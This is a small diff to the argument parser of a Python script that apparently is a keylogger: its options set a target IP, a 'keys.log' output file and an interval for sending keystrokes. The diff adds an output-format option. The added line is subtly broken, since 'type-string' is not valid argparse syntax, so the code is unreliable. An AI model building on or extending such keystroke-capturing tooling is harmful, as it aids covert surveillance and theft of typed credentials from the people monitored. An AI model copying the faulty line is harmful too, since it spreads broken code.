@@ -232,6 +232,7 @@ if __name__ == "__main__":
     parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
     parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
     parser.add_argument('-i', '--interval', type=int, default=60, help='Interval to send keystrokes')
+    parser.add_argument('-of', '--format', type-string, default='html', help='Specify the format of the output logs')
 
     args = parser.parse_args()
 
